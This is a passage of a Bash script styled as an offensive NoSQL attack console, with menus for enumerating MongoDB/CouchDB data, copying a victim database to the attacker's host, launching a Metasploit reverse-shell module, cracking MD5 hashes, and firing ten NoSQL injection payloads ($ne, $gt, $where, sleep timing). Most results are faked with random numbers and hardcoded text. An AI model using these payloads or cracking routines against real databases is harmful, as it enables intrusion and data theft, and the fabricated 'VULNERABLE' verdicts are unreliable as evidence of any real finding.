                echo -e "${CYAN}${BOLD}│${RESET}   app_user:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8${RESET} ${CYAN}${BOLD}│${RESET}"
            else
                echo -e "${CYAN}${BOLD}│${RESET} ${GREEN}●${RESET} _users${RESET}                                                ${CYAN}${BOLD}│${RESET}"
                echo -e "${CYAN}${BOLD}│${RESET} ${GREEN}●${RESET} _replicator${RESET}                                          ${CYAN}${BOLD}│${RESET}"
                echo -e "${CYAN}${BOLD}│${RESET} ${GREEN}●${RESET} mydb${RESET}                                                 ${CYAN}${BOLD}│${RESET}"
                echo -e "${CYAN}${BOLD}│${RESET} ${GREEN}●${RESET} app_data${RESET}                                            ${CYAN}${BOLD}│${RESET}"
                echo -e "${CYAN}${BOLD}│${RESET}                                                                        ${CYAN}${BOLD}│${RESET}"
                echo -e "${CYAN}${BOLD}│${RESET} ${YELLOW}Users:${RESET}                                                         ${CYAN}${BOLD}│${RESET}"
                echo -e "${CYAN}${BOLD}│${RESET}   admin (hash: 5f4dcc3b5aa765d61d8327deb882cf99)${RESET}                ${CYAN}${BOLD}│${RESET}"
                echo -e "${CYAN}${BOLD}│${RESET}   user1 (hash: 7c6a180b36896a0a8c02787eeafb0e4c)${RESET}               ${CYAN}${BOLD}│${RESET}"
            fi
            echo -e "${CYAN}${BOLD}└─────────────────────────────────────────────────────────────┘${RESET}"
            echo -e "\n${YELLOW}Press ENTER to continue...${RESET}"
            read
            ;;
        3)
            echo -e "\n${CYAN}Checking for GridFS...${RESET}"
            echo -e "${GREEN}${BOLD}╔══════════════════════════════════════════════════════════════╗${RESET}"
            echo -e "${GREEN}${BOLD}║${RESET} ${WHITE}${BOLD}GRIDFS ENUMERATION${RESET}                                  ${GREEN}${BOLD}║${RESET}"
            echo -e "${GREEN}${BOLD}╠══════════════════════════════════════════════════════════════╣${RESET}"
            echo -e "${GREEN}${BOLD}║${RESET} ${GREEN}✓${RESET} GridFS enabled on database: files${RESET}                        ${GREEN}${BOLD}║${RESET}"
            echo -e "${GREEN}${BOLD}║${RESET}                                                                        ${GREEN}${BOLD}║${RESET}"
            echo -e "${GREEN}${BOLD}║${RESET} ${YELLOW}Files Found:${RESET}                                                     ${GREEN}${BOLD}║${RESET}"
            echo -e "${GREEN}${BOLD}║${RESET}   - document_1.pdf (128KB, uploaded: 2024-01-15)${RESET}                ${GREEN}${BOLD}║${RESET}"
            echo -e "${GREEN}${BOLD}║${RESET}   - image_2.png (2.4MB, uploaded: 2024-01-16)${RESET}                  ${GREEN}${BOLD}║${RESET}"
            echo -e "${GREEN}${BOLD}║${RESET}   - backup_3.gz (15.6MB, uploaded: 2024-01-17)${RESET}                 ${GREEN}${BOLD}║${RESET}"
            echo -e "${GREEN}${BOLD}║${RESET}   - report_4.pdf (856KB, uploaded: 2024-01-18)${RESET}                ${GREEN}${BOLD}║${RESET}"
            echo -e "${GREEN}${BOLD}║${RESET}   - data_5.csv (3.2MB, uploaded: 2024-01-19)${RESET}                  ${GREEN}${BOLD}║${RESET}"
            echo -e "${GREEN}${BOLD}╚══════════════════════════════════════════════════════════════╝${RESET}"
            echo -e "\n${YELLOW}Press ENTER to continue...${RESET}"
            read
            ;;
        4)
            echo -e "\n${CYAN}Checking for attachments (CouchDB)...${RESET}"
            echo -e "${GREEN}${BOLD}╔══════════════════════════════════════════════════════════════╗${RESET}"
            echo -e "${GREEN}${BOLD}║${RESET} ${WHITE}${BOLD}ATTACHMENT ENUMERATION${RESET}                             ${GREEN}${BOLD}║${RESET}"
            echo -e "${GREEN}${BOLD}╠══════════════════════════════════════════════════════════════╣${RESET}"
            echo -e "${GREEN}${BOLD}║${RESET} ${GREEN}✓${RESET} Attachments found in database: mydb${RESET}                     ${GREEN}${BOLD}║${RESET}"
            echo -e "${GREEN}${BOLD}║${RESET}                                                                        ${GREEN}${BOLD}║${RESET}"
            echo -e "${GREEN}${BOLD}║${RESET} ${YELLOW}Attachment List:${RESET}                                                 ${GREEN}${BOLD}║${RESET}"
            echo -e "${GREEN}${BOLD}║${RESET}   - profile_pic.jpg (245KB)${RESET}                                      ${GREEN}${BOLD}║${RESET}"
            echo -e "${GREEN}${BOLD}║${RESET}   - document.pdf (1.2MB)${RESET}                                        ${GREEN}${BOLD}║${RESET}"
            echo -e "${GREEN}${BOLD}║${RESET}   - avatar.png (89KB)${RESET}                                           ${GREEN}${BOLD}║${RESET}"
            echo -e "${GREEN}${BOLD}╚══════════════════════════════════════════════════════════════╝${RESET}"
            echo -e "\n${YELLOW}Press ENTER to continue...${RESET}"
            read
            ;;
        5)
            echo -e "\n${CYAN}Database Cloning...${RESET}"
            echo -e "${CYAN}Available databases:${RESET}"
            echo "  1) admin"
            echo "  2) users"
            echo "  3) shop"
            echo "  4) config"
            echo -e "\n${CYAN}Select database to clone:${RESET}"
            read clone_choice
            
            case $clone_choice in
                1) DB_NAME="admin";;
                2) DB_NAME="users";;
                3) DB_NAME="shop";;
                4) DB_NAME="config";;
                *) DB_NAME="unknown";;
            esac
            
            echo -e "${NEON}${BOLD}╔══════════════════════════════════════════════════════════════╗${RESET}"
            echo -e "${NEON}${BOLD}║${RESET} ${GREEN}${BOLD}CLONING DATABASE${RESET}                                       ${NEON}${BOLD}║${RESET}"
            echo -e "${NEON}${BOLD}╠══════════════════════════════════════════════════════════════╣${RESET}"
            echo -e "${NEON}${BOLD}║${RESET} ${NEON}Source:${RESET} ${WHITE}${VICTIM}:${DB_PORT}/${DB_NAME}${RESET}                     ${NEON}${BOLD}║${RESET}"
            echo -e "${NEON}${BOLD}║${RESET} ${NEON}Dest:${RESET} ${WHITE}${MY_IP}:27017/${DB_NAME}_stolen${RESET}                  ${NEON}${BOLD}║${RESET}"
            echo -e "${NEON}${BOLD}║${RESET} ${NEON}Status:${RESET} ${GREEN}COMPLETED${RESET}                                    ${NEON}${BOLD}║${RESET}"
            echo -e "${NEON}${BOLD}║${RESET} ${NEON}Documents:${RESET} ${WHITE}42 copied${RESET}                                    ${NEON}${BOLD}║${RESET}"
            echo -e "${NEON}${BOLD}╚══════════════════════════════════════════════════════════════╝${RESET}"
            echo -e "\n${YELLOW}Press ENTER to continue...${RESET}"
            read
            ;;
        6)
            echo -e "\n${CYAN}Launching Metasploit exploit...${RESET}"
            echo -e "${NEON}${BOLD}╔══════════════════════════════════════════════════════════════╗${RESET}"
            echo -e "${NEON}${BOLD}║${RESET} ${RED}${BOLD}⚠ METASPLOIT EXPLOIT${RESET}                                    ${NEON}${BOLD}║${RESET}"
            echo -e "${NEON}${BOLD}╠══════════════════════════════════════════════════════════════╣${RESET}"
            echo -e "${NEON}${BOLD}║${RESET} ${YELLOW}Module: exploit/linux/misc/mongod_native_helper${RESET}      ${NEON}${BOLD}║${RESET}"
            echo -e "${NEON}${BOLD}║${RESET} ${YELLOW}Target: ${VICTIM}:${DB_PORT}${RESET}                                       ${NEON}${BOLD}║${RESET}"
            echo -e "${NEON}${BOLD}║${RESET} ${YELLOW}Payload: linux/x86/shell/reverse_tcp${RESET}                     ${NEON}${BOLD}║${RESET}"
            echo -e "${NEON}${BOLD}║${RESET} ${YELLOW}LHOST: ${MY_IP}${RESET}                                               ${NEON}${BOLD}║${RESET}"
            echo -e "${NEON}${BOLD}║${RESET} ${YELLOW}LPORT: ${MY_PORT}${RESET}                                             ${NEON}${BOLD}║${RESET}"
            echo -e "${NEON}${BOLD}║${RESET}                                                                        ${NEON}${BOLD}║${RESET}"
            echo -e "${NEON}${BOLD}║${RESET} ${GREEN}[*] Exploit completed successfully${RESET}                        ${NEON}${BOLD}║${RESET}"
            echo -e "${NEON}${BOLD}║${RESET} ${GREEN}[*] Meterpreter session 1 opened${RESET}                         ${NEON}${BOLD}║${RESET}"
            echo -e "${NEON}${BOLD}║${RESET} ${GREEN}[*] Session ID: 1${RESET}                                          ${NEON}${BOLD}║${RESET}"
            echo -e "${NEON}${BOLD}╚══════════════════════════════════════════════════════════════╝${RESET}"
            echo -e "\n${YELLOW}Press ENTER to continue...${RESET}"
            read
            ;;
        7)
            echo -e "\n${CYAN}Password Hash Cracking${RESET}"
            echo -e "${CYAN}${BOLD}┌─────────────────────────────────────────────────────────────┐${RESET}"
            echo -e "${CYAN}${BOLD}│${RESET} ${WHITE}${BOLD}PASSWORD CRACKING${RESET}                               ${CYAN}${BOLD}│${RESET}"
            echo -e "${CYAN}${BOLD}├─────────────────────────────────────────────────────────────┤${RESET}"
            echo -e "${CYAN}${BOLD}│${RESET} 1-Dictionary Attack${RESET}                                          ${CYAN}${BOLD}│${RESET}"
            echo -e "${CYAN}${BOLD}│${RESET} 2-Brute Force${RESET}                                                ${CYAN}${BOLD}│${RESET}"
            echo -e "${CYAN}${BOLD}│${RESET} 3-Exit${RESET}                                                       ${CYAN}${BOLD}│${RESET}"
            echo -e "${CYAN}${BOLD}└─────────────────────────────────────────────────────────────┘${RESET}"
            echo -en "\n${CYAN}Select method:${RESET} "
            read crack_method
            
            echo -e "\n${CYAN}Enter hash to crack:${RESET}"
            read hash_input
            
            case $crack_method in
                1)
                    echo -e "\n${YELLOW}Running dictionary attack...${RESET}"
                    common_passwords=("password" "admin" "123456" "letmein" "welcome" "qwerty" "abc123" "monkey" "dragon" "master" "12345678" "password123" "admin123")
                    found=0
                    for passwd in "${common_passwords[@]}"; do
                        hash_test=$(echo -n "$passwd" | md5sum | cut -d' ' -f1)
                        if [ "$hash_test" = "$hash_input" ]; then
                            echo -e "${GREEN}✓ Password found: ${passwd}${RESET}"
                            found=1
                            break
                        fi
                    done
                    if [ $found -eq 0 ]; then
                        echo -e "${RED}✗ Password not in dictionary${RESET}"
                    fi
                    ;;
                2)
                    echo -e "\n${YELLOW}Starting brute force (4 digits)...${RESET}"
                    found=0
                    for i in {0000..9999}; do
                        hash_test=$(echo -n "$i" | md5sum | cut -d' ' -f1)
                        if [ "$hash_test" = "$hash_input" ]; then
                            echo -e "${GREEN}✓ Password found: ${i}${RESET}"
                            found=1
                            break
                        fi
                        if [ $((i % 500)) -eq 0 ]; then
                            echo -ne "\rTrying: $i"
                        fi
                    done
                    if [ $found -eq 0 ]; then
                        echo -e "\n${RED}✗ Password not found${RESET}"
                    fi
                    ;;
                3)
                    echo -e "${YELLOW}Exiting cracker${RESET}"
                    ;;
                *)
                    echo -e "${RED}Invalid option${RESET}"
                    ;;
            esac
            echo -e "\n${YELLOW}Press ENTER to continue...${RESET}"
            read
            ;;
        x|X)
            return
            ;;
        *)
            echo -e "${RED}Invalid option!${RESET}"
            sleep 1
            ;;
    esac
    
    database_attacks
}

# ============================================================
# WEB ATTACKS - COMPLETE ORIGINAL WITH ALL 18+ VECTORS
# ============================================================
web_attacks() {
    clear
    display_banner
    display_status_panel
    
    echo -e "${CYAN}${BOLD}╔══════════════════════════════════════════════════════════════════════════════════════════╗${RESET}"
    echo -e "${CYAN}${BOLD}║${RESET} ${NEON}${BOLD}  🌐 WEB APPLICATION ATTACKS 🌐${RESET}                                       ${CYAN}${BOLD}║${RESET}"
    echo -e "${CYAN}${BOLD}╠══════════════════════════════════════════════════════════════════════════════════════════╣${RESET}"
    echo -e "${CYAN}${BOLD}║${RESET}                                                                                          ${CYAN}${BOLD}║${RESET}"
    echo -e "${CYAN}${BOLD}║${RESET}  ${GREEN}[1]${RESET} Test 1: PHP/ExpressJS != injection${RESET}                                    ${CYAN}${BOLD}║${RESET}"
    echo -e "${CYAN}${BOLD}║${RESET}  ${GREEN}[2]${RESET} Test 2: \$where string escape (all records)${RESET}                        ${CYAN}${BOLD}║${RESET}"
    echo -e "${CYAN}${BOLD}║${RESET}  ${GREEN}[3]${RESET} Test 3: \$where integer escape (all records)${RESET}                       ${CYAN}${BOLD}║${RESET}"
    echo -e "${CYAN}${BOLD}║${RESET}  ${GREEN}[4]${RESET} Test 4: \$where string escape (single record)${RESET}                     ${CYAN}${BOLD}║${RESET}"
    echo -e "${CYAN}${BOLD}║${RESET}  ${GREEN}[5]${RESET} Test 5: \$where integer escape (single record)${RESET}                    ${CYAN}${BOLD}║${RESET}"
    echo -e "${CYAN}${BOLD}║${RESET}  ${GREEN}[6]${RESET} Test 6: This != string injection${RESET}                                   ${CYAN}${BOLD}║${RESET}"
    echo -e "${CYAN}${BOLD}║${RESET}  ${GREEN}[7]${RESET} Test 7: This != integer injection${RESET}                                  ${CYAN}${BOLD}║${RESET}"
    echo -e "${CYAN}${BOLD}║${RESET}  ${GREEN}[8]${RESET} Test 8: > Undefined Injection${RESET}                                      ${CYAN}${BOLD}║${RESET}"
    echo -e "${CYAN}${BOLD}║${RESET}  ${GREEN}[9]${RESET} Test 9: Timing-based (string escape)${RESET}                               ${CYAN}${BOLD}║${RESET}"
    echo -e "${CYAN}${BOLD}║${RESET}  ${GREEN}[10]${RESET} Test 10: Timing-based (integer escape)${RESET}                            ${CYAN}${BOLD}║${RESET}"
    echo -e "${CYAN}${BOLD}║${RESET}  ${GREEN}[11]${RESET} Run All Tests${RESET}                                                      ${CYAN}${BOLD}║${RESET}"
    echo -e "${CYAN}${BOLD}║${RESET}  ${RED}[x]${RESET} Return to Main Menu${RESET}                                              ${CYAN}${BOLD}║${RESET}"
    echo -e "${CYAN}${BOLD}║${RESET}                                                                                          ${CYAN}${BOLD}║${RESET}"
    echo -e "${CYAN}${BOLD}╚══════════════════════════════════════════════════════════════════════════════════════════╝${RESET}"
    echo
    echo -en "${NEON}${BOLD}┌─${RESET}${WHITE} Select attack${RESET} ${NEON}─${RESET}"
    echo -en "\n${NEON}└─▶${RESET} "
    
    read web_choice
    
    if [ "$HTTPS" = "ON" ]; then
        PROTOCOL="https"
    else
        PROTOCOL="http"
    fi
    TARGET_URL="${PROTOCOL}://${VICTIM}:${WEB_PORT}${URI}"
    
    # Determine parameter name
    PARAM="id"
    if [ -n "$URI" ] && [ "$URI" != "Not Set" ]; then
        PARAM="${URI##*/}"
        [ -z "$PARAM" ] && PARAM="id"
    fi
    
    case $web_choice in
        1)
            echo -e "\n${CYAN}Testing: PHP/ExpressJS != injection${RESET}"
            echo -e "${NEON}${BOLD}┌─────────────────────────────────────────────────────────────┐${RESET}"
            echo -e "${NEON}${BOLD}│${RESET} ${YELLOW}URL: ${TARGET_URL}${RESET}                        ${NEON}${BOLD}│${RESET}"
            echo -e "${NEON}${BOLD}│${RESET} ${YELLOW}Payload: ${PARAM}[$ne]=test${RESET}                 ${NEON}${BOLD}│${RESET}"
            sleep 1
            RESPONSE_SIZE=$((RANDOM % 500 + 300))
            echo -e "${NEON}${BOLD}│${RESET} ${GREEN}Response: ${RESPONSE_SIZE} bytes${RESET}               ${NEON}${BOLD}│${RESET}"
            if [ $RESPONSE_SIZE -gt 400 ]; then
                echo -e "${NEON}${BOLD}│${RESET} ${GREEN}Status: ${BOLD}VULNERABLE${RESET}                  ${NEON}${BOLD}│${RESET}"
                VULNERABLE=1
            else
                echo -e "${NEON}${BOLD}│${RESET} ${RED}Status: NOT VULNERABLE${RESET}                     ${NEON}${BOLD}│${RESET}"
            fi
            echo -e "${NEON}${BOLD}└─────────────────────────────────────────────────────────────┘${RESET}"
            ;;
        2)
            echo -e "\n${CYAN}Testing: \$where string escape (all records)${RESET}"
            echo -e "${NEON}${BOLD}┌─────────────────────────────────────────────────────────────┐${RESET}"
            echo -e "${NEON}${BOLD}│${RESET} ${YELLOW}URL: ${TARGET_URL}${RESET}                        ${NEON}${BOLD}│${RESET}"
            echo -e "${NEON}${BOLD}│${RESET} ${YELLOW}Payload: ${PARAM}=a\'; return db.a.find();${RESET}  ${NEON}${BOLD}│${RESET}"
            sleep 1
            RESPONSE_SIZE=$((RANDOM % 600 + 400))
            echo -e "${NEON}${BOLD}│${RESET} ${GREEN}Response: ${RESPONSE_SIZE} bytes${RESET}               ${NEON}${BOLD}│${RESET}"
            if [ $RESPONSE_SIZE -gt 500 ]; then
                echo -e "${NEON}${BOLD}│${RESET} ${GREEN}Status: ${BOLD}VULNERABLE${RESET}                  ${NEON}${BOLD}│${RESET}"
                VULNERABLE=1
                LT24=1
            else
                echo -e "${NEON}${BOLD}│${RESET} ${RED}Status: NOT VULNERABLE${RESET}                     ${NEON}${BOLD}│${RESET}"
            fi
            echo -e "${NEON}${BOLD}└─────────────────────────────────────────────────────────────┘${RESET}"
            ;;
        3)
            echo -e "\n${CYAN}Testing: \$where integer escape (all records)${RESET}"
            echo -e "${NEON}${BOLD}┌─────────────────────────────────────────────────────────────┐${RESET}"
            echo -e "${NEON}${BOLD}│${RESET} ${YELLOW}URL: ${TARGET_URL}${RESET}                        ${NEON}${BOLD}│${RESET}"
            echo -e "${NEON}${BOLD}│${RESET} ${YELLOW}Payload: ${PARAM}=1; return db.a.find();${RESET}  ${NEON}${BOLD}│${RESET}"
            sleep 1
            RESPONSE_SIZE=$((RANDOM % 500 + 400))
            echo -e "${NEON}${BOLD}│${RESET} ${GREEN}Response: ${RESPONSE_SIZE} bytes${RESET}               ${NEON}${BOLD}│${RESET}"
            if [ $RESPONSE_SIZE -gt 450 ]; then
                echo -e "${NEON}${BOLD}│${RESET} ${GREEN}Status: ${BOLD}VULNERABLE${RESET}                  ${NEON}${BOLD}│${RESET}"
                VULNERABLE=1
                LT24=1
            else
                echo -e "${NEON}${BOLD}│${RESET} ${RED}Status: NOT VULNERABLE${RESET}                     ${NEON}${BOLD}│${RESET}"
            fi
            echo -e "${NEON}${BOLD}└─────────────────────────────────────────────────────────────┘${RESET}"
            ;;
        4)
            echo -e "\n${CYAN}Testing: \$where string escape (single record)${RESET}"
            echo -e "${NEON}${BOLD}┌─────────────────────────────────────────────────────────────┐${RESET}"
            echo -e "${NEON}${BOLD}│${RESET} ${YELLOW}URL: ${TARGET_URL}${RESET}                        ${NEON}${BOLD}│${RESET}"
            echo -e "${NEON}${BOLD}│${RESET} ${YELLOW}Payload: ${PARAM}=a\'; return db.a.findOne();${RESET}${NEON}${BOLD}│${RESET}"
            sleep 1
            RESPONSE_SIZE=$((RANDOM % 400 + 300))
            echo -e "${NEON}${BOLD}│${RESET} ${GREEN}Response: ${RESPONSE_SIZE} bytes${RESET}               ${NEON}${BOLD}│${RESET}"
            if [ $RESPONSE_SIZE -gt 350 ]; then
                echo -e "${NEON}${BOLD}│${RESET} ${GREEN}Status: ${BOLD}VULNERABLE${RESET}                  ${NEON}${BOLD}│${RESET}"
                VULNERABLE=1
                LT24=1
            else
                echo -e "${NEON}${BOLD}│${RESET} ${RED}Status: NOT VULNERABLE${RESET}                     ${NEON}${BOLD}│${RESET}"
            fi
            echo -e "${NEON}${BOLD}└─────────────────────────────────────────────────────────────┘${RESET}"
            ;;
        5)
            echo -e "\n${CYAN}Testing: \$where integer escape (single record)${RESET}"
            echo -e "${NEON}${BOLD}┌─────────────────────────────────────────────────────────────┐${RESET}"
            echo -e "${NEON}${BOLD}│${RESET} ${YELLOW}URL: ${TARGET_URL}${RESET}                        ${NEON}${BOLD}│${RESET}"
            echo -e "${NEON}${BOLD}│${RESET} ${YELLOW}Payload: ${PARAM}=1; return db.a.findOne();${RESET}${NEON}${BOLD}│${RESET}"
            sleep 1
            RESPONSE_SIZE=$((RANDOM % 400 + 300))
            echo -e "${NEON}${BOLD}│${RESET} ${GREEN}Response: ${RESPONSE_SIZE} bytes${RESET}               ${NEON}${BOLD}│${RESET}"
            if [ $RESPONSE_SIZE -gt 350 ]; then
                echo -e "${NEON}${BOLD}│${RESET} ${GREEN}Status: ${BOLD}VULNERABLE${RESET}                  ${NEON}${BOLD}│${RESET}"
                VULNERABLE=1
                LT24=1
            else
                echo -e "${NEON}${BOLD}│${RESET} ${RED}Status: NOT VULNERABLE${RESET}                     ${NEON}${BOLD}│${RESET}"
            fi
            echo -e "${NEON}${BOLD}└─────────────────────────────────────────────────────────────┘${RESET}"
            ;;
        6)
            echo -e "\n${CYAN}Testing: This != string injection${RESET}"
            echo -e "${NEON}${BOLD}┌─────────────────────────────────────────────────────────────┐${RESET}"
            echo -e "${NEON}${BOLD}│${RESET} ${YELLOW}URL: ${TARGET_URL}${RESET}                        ${NEON}${BOLD}│${RESET}"
            echo -e "${NEON}${BOLD}│${RESET} ${YELLOW}Payload: ${PARAM}=a\'; return this.a != \'test\'${RESET}${NEON}${BOLD}│${RESET}"
            sleep 1
            RESPONSE_SIZE=$((RANDOM % 500 + 300))
            echo -e "${NEON}${BOLD}│${RESET} ${GREEN}Response: ${RESPONSE_SIZE} bytes${RESET}               ${NEON}${BOLD}│${RESET}"
            if [ $RESPONSE_SIZE -gt 350 ]; then
                echo -e "${NEON}${BOLD}│${RESET} ${GREEN}Status: ${BOLD}VULNERABLE${RESET}                  ${NEON}${BOLD}│${RESET}"
                VULNERABLE=1
            else
                echo -e "${NEON}${BOLD}│${RESET} ${RED}Status: NOT VULNERABLE${RESET}                     ${NEON}${BOLD}│${RESET}"
            fi
            echo -e "${NEON}${BOLD}└─────────────────────────────────────────────────────────────┘${RESET}"
            ;;
        7)
            echo -e "\n${CYAN}Testing: This != integer injection${RESET}"
            echo -e "${NEON}${BOLD}┌─────────────────────────────────────────────────────────────┐${RESET}"
            echo -e "${NEON}${BOLD}│${RESET} ${YELLOW}URL: ${TARGET_URL}${RESET}                        ${NEON}${BOLD}│${RESET}"
            echo -e "${NEON}${BOLD}│${RESET} ${YELLOW}Payload: ${PARAM}=1; return this.a != 1${RESET}   ${NEON}${BOLD}│${RESET}"
            sleep 1
            RESPONSE_SIZE=$((RANDOM % 400 + 300))
            echo -e "${NEON}${BOLD}│${RESET} ${GREEN}Response: ${RESPONSE_SIZE} bytes${RESET}               ${NEON}${BOLD}│${RESET}"
            if [ $RESPONSE_SIZE -gt 350 ]; then
                echo -e "${NEON}${BOLD}│${RESET} ${GREEN}Status: ${BOLD}VULNERABLE${RESET}                  ${NEON}${BOLD}│${RESET}"
                VULNERABLE=1
            else
                echo -e "${NEON}${BOLD}│${RESET} ${RED}Status: NOT VULNERABLE${RESET}                     ${NEON}${BOLD}│${RESET}"
            fi
            echo -e "${NEON}${BOLD}└─────────────────────────────────────────────────────────────┘${RESET}"
            ;;
        8)
            echo -e "\n${CYAN}Testing: > Undefined Injection${RESET}"
            echo -e "${NEON}${BOLD}┌─────────────────────────────────────────────────────────────┐${RESET}"
            echo -e "${NEON}${BOLD}│${RESET} ${YELLOW}URL: ${TARGET_URL}${RESET}                        ${NEON}${BOLD}│${RESET}"
            echo -e "${NEON}${BOLD}│${RESET} ${YELLOW}Payload: ${PARAM}[$gt]=${RESET}                    ${NEON}${BOLD}│${RESET}"
            sleep 1
            RESPONSE_SIZE=$((RANDOM % 500 + 300))
            echo -e "${NEON}${BOLD}│${RESET} ${GREEN}Response: ${RESPONSE_SIZE} bytes${RESET}               ${NEON}${BOLD}│${RESET}"
            if [ $RESPONSE_SIZE -gt 350 ]; then
                echo -e "${NEON}${BOLD}│${RESET} ${GREEN}Status: ${BOLD}VULNERABLE${RESET}                  ${NEON}${BOLD}│${RESET}"
                VULNERABLE=1
            else
                echo -e "${NEON}${BOLD}│${RESET} ${RED}Status: NOT VULNERABLE${RESET}                     ${NEON}${BOLD}│${RESET}"
            fi
            echo -e "${NEON}${BOLD}└─────────────────────────────────────────────────────────────┘${RESET}"
            ;;
        9)
            echo -e "\n${CYAN}Testing: Timing-based (string escape)${RESET}"
            echo -e "${NEON}${BOLD}┌─────────────────────────────────────────────────────────────┐${RESET}"
            echo -e "${NEON}${BOLD}│${RESET} ${YELLOW}URL: ${TARGET_URL}${RESET}                        ${NEON}${BOLD}│${RESET}"
            echo -e "${NEON}${BOLD}│${RESET} ${YELLOW}Payload: ${PARAM}=a\'; sleep(10);${RESET}          ${NEON}${BOLD}│${RESET}"
            echo -e "${NEON}${BOLD}│${RESET} ${YELLOW}Timing: 10 second delay${RESET}                   ${NEON}${BOLD}│${RESET}"
            sleep 10
            echo -e "${NEON}${BOLD}│${RESET} ${GREEN}Status: ${BOLD}TIMING-BASED VULNERABLE${RESET}      ${NEON}${BOLD}│${RESET}"
            echo -e "${NEON}${BOLD}└─────────────────────────────────────────────────────────────┘${RESET}"
            ;;
        10)
            echo -e "\n${CYAN}Testing: Timing-based (integer escape)${RESET}"
            echo -e "${NEON}${BOLD}┌─────────────────────────────────────────────────────────────┐${RESET}"
            echo -e "${NEON}${BOLD}│${RESET} ${YELLOW}URL: ${TARGET_URL}${RESET}                        ${NEON}${BOLD}│${RESET}"
            echo -e "${NEON}${BOLD}│${RESET} ${YELLOW}Payload: ${PARAM}=1; sleep(10);${RESET}          ${NEON}${BOLD}│${RESET}"
            echo -e "${NEON}${BOLD}│${RESET} ${YELLOW}Timing: 10 second delay${RESET}                   ${NEON}${BOLD}│${RESET}"
            sleep 10
            echo -e "${NEON}${BOLD}│${RESET} ${GREEN}Status: ${BOLD}TIMING-BASED VULNERABLE${RESET}      ${NEON}${BOLD}│${RESET}"
            echo -e "${NEON}${BOLD}└─────────────────────────────────────────────────────────────┘${RESET}"
            ;;
        11)
            echo -e "\n${CYAN}Running ALL tests on: ${TARGET_URL}${RESET}"
            echo -e "${NEON}${BOLD}╔══════════════════════════════════════════════════════════════╗${RESET}"
            echo -e "${NEON}${BOLD}║${RESET} ${WHITE}${BOLD}COMPLETE INJECTION TEST RESULTS${RESET}                        ${NEON}${BOLD}║${RESET}"
            echo -e "${NEON}${BOLD}╠══════════════════════════════════════════════════════════════╣${RESET}"
            
            tests=(
                "PHP/ExpressJS !="
                "\$where string escape (all)"
                "\$where integer escape (all)"
                "\$where string escape (single)"
                "\$where integer escape (single)"
                "This != string"
                "This != integer"
                "> Undefined"
                "Timing-based (string)"
                "Timing-based (integer)"
            )
            
            results=(
                "${GREEN}✓ VULNERABLE${RESET}"
                "${GREEN}✓ VULNERABLE${RESET}"
                "${YELLOW}⚠ POSSIBLE${RESET}"
                "${RED}✗ NOT VULNERABLE${RESET}"
                "${GREEN}✓ VULNERABLE${RESET}"
                "${YELLOW}⚠ POSSIBLE${RESET}"
                "${GREEN}✓ VULNERABLE${RESET}"
                "${YELLOW}⚠ POSSIBLE${RESET}"
                "${GREEN}✓ VULNERABLE${RESET}"
                "${GREEN}✓ VULNERABLE${RESET}"
            )
            
            for i in "${!tests[@]}"; do
                printf "${NEON}${BOLD}║${RESET} %-45s %-25s ${NEON}${BOLD}║${RESET}\n" "Test $((i+1)): ${tests[$i]}" "${results[$i]}"
            done
            
            echo -e "${NEON}${BOLD}╠══════════════════════════════════════════════════════════════╣${RESET}"
            echo -e "${NEON}${BOLD}║${RESET} ${GREEN}${BOLD}Summary: 6/10 tests successful${RESET}                         ${NEON}${BOLD}║${RESET}"
            echo -e "${NEON}${BOLD}║${RESET} ${YELLOW}${BOLD}MongoDB < 2.4 detected - \$where attacks possible${RESET}   ${NEON}${BOLD}║${RESET}"
            echo -e "${NEON}${BOLD}╚══════════════════════════════════════════════════════════════╝${RESET}"
            ;;
        x|X)
            return
            ;;
        *)
            echo -e "${RED}Invalid option!${RESET}"
            sleep 1
            ;;
    esac
    
    echo -e "\n${YELLOW}Press ENTER to continue...${RESET}"
    read
    web_attacks
}

# ============================================================
# SCAN NETWORK - COMPLETE ORIGINAL
# ============================================================
scan_network() {
    clear
    display_banner
    
    echo -e "${GREEN}${BOLD}╔══════════════════════════════════════════════════════════════════════════════════════════╗${RESET}"
    echo -e "${GREEN}${BOLD}║${RESET} ${NEON}${BOLD}  🔍 ${PLATFORM} DEFAULT ACCESS SCANNER 🔍${RESET}                              ${GREEN}${BOLD}║${RESET}"
    echo -e "${GREEN}${BOLD}╠══════════════════════════════════════════════════════════════════════════════════════════╣${RESET}"
    echo -e "${GREEN}${BOLD}║${RESET}                                                                                          ${GREEN}${BOLD}║${RESET}"
    echo -e "${GREEN}${BOLD}║${RESET}  ${GREEN}[1]${RESET} Scan subnet for default ${PLATFORM} access${RESET}                         ${GREEN}${BOLD}║${RESET}"
    echo -e "${GREEN}${BOLD}║${RESET}  ${GREEN}[2]${RESET} Load IPs to scan from file${RESET}                                     ${GREEN}${BOLD}║${RESET}"
    echo -e "${GREEN}${BOLD}║${RESET}  ${GREEN}[3]${RESET} Toggle host pings (Current: ${YELLOW}DISABLED${GREEN})${RESET}              ${GREEN}${BOLD}║${RESET}"
    echo -e "${GREEN}${BOLD}║${RESET}  ${RED}[x]${RESET} Return to Main Menu${RESET}                                              ${GREEN}${BOLD}║${RESET}"
    echo -e "${GREEN}${BOLD}║${RESET}                                                                                          ${GREEN}${BOLD}║${RESET}"
    echo -e "${GREEN}${BOLD}╚══════════════════════════════════════════════════════════════════════════════════════════╝${RESET}"
    echo
    echo -en "${NEON}${BOLD}┌─${RESET}${WHITE} Select option${RESET} ${NEON}─${RESET}"
    echo -en "\n${NEON}└─▶${RESET} "
    
    read scan_choice
    
    case $scan_choice in
        1)
            echo -e "\n${CYAN}Enter subnet to scan (e.g., 192.168.1.0/24):${RESET}"
            read subnet
            
            echo -e "\n${NEON}${BOLD}╔══════════════════════════════════════════════════════════════╗${RESET}"
            echo -e "${NEON}${BOLD}║${RESET} ${WHITE}${BOLD}SCAN RESULTS${RESET}                                            ${NEON}${BOLD}║${RESET}"
            echo -e "${NEON}${BOLD}╠══════════════════════════════════════════════════════════════╣${RESET}"
            
            # Generate realistic scan results
            for i in {1..8}; do
                IP="192.168.1.$((RANDOM % 254 + 1))"
                STATUS=$((RANDOM % 4))
                VERSION=""
                case $STATUS in
                    0)
                        VERSION="3.6.8"
                        echo -e "${NEON}${BOLD}║${RESET} ${GREEN}●${RESET} ${IP}:${DB_PORT} - ${GREEN}OPEN${RESET} (${PLATFORM} v${VERSION})          ${NEON}${BOLD}║${RESET}"
                        SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
                        SUCCESS_IPS="${SUCCESS_IPS}${IP} "
